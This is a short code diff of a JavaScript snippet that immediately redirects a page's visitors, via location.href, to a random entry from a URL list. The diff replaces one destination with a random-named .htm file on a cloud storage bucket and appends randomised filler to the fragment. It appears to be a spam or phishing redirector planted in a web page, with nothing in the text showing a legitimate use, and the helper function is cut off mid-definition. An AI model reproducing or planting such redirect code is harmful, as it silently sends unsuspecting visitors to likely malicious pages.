@@ -1,5 +1,5 @@
 var urls=[
-' https://resource.edc.org.cn/edc/1717171876867.HTm#{nnnnnnn}{wwww}',
+' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/26aedb4d42b34119966b3a6177d3ddea.htm#{nnnnnnn}{wwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
